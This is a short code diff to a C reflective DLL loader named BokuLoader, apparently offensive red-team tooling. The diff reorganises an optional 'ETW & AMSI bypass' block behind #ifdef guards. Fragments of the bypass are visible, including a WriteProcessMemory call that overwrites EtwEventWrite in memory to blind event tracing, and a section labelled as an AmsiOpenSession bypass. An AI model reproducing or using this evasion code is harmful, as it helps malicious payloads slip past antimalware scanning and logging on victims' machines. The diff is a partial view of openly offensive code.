@@ -1,9 +1,6 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
-#define BYPASS // ETW & AMSI bypass switch. Comment out this line to disable 
-#ifdef BYPASS
-typedef BOOL (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
-#endif
+
 void* getDllBase(void*);
 void* getExportDirectory(void* dllAddr);
 void* getExportAddressTable(void* dllBase, void* dllExportDirectory);
@@ -58,7 +55,11 @@ typedef void*  (WINAPI * tVirtualAlloc) (void*, unsigned __int64, unsigned long,
 typedef void*  (WINAPI * tVirtualProtect)(void*, unsigned __int64, unsigned long, unsigned long*);
 typedef void*  (NTAPI  * tNtFlushInstructionCache)(HANDLE, PVOID, unsigned long);
 typedef void*  (WINAPI * DLLMAIN)(HINSTANCE, unsigned long, void* );
+#define BYPASS // ETW & AMSI bypass switch. Comment out this line to disable 
+#ifdef BYPASS
+typedef BOOL (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
 void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA);
+#endif
 
 __declspec(dllexport) void* WINAPI BokuLoader()
 {
@@ -593,6 +594,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     return rdll_dst.EntryPoint;
 }
 
+#ifdef BYPASS
 // ######### OPTIONAL BYPASS AMSI & ETW CODE ########
 void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
     // ######### AMSI.AmsiOpenSession Bypass
@@ -687,6 +689,7 @@ void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
     pWriteProcessMemory((PVOID)-1, pEtwEventWrite, (PVOID)etwbypass, sizeof(etwbypass), &bytesWritten);
     return;
 }
+#endif
 
 __asm__(
 "getRdllBase: \n"
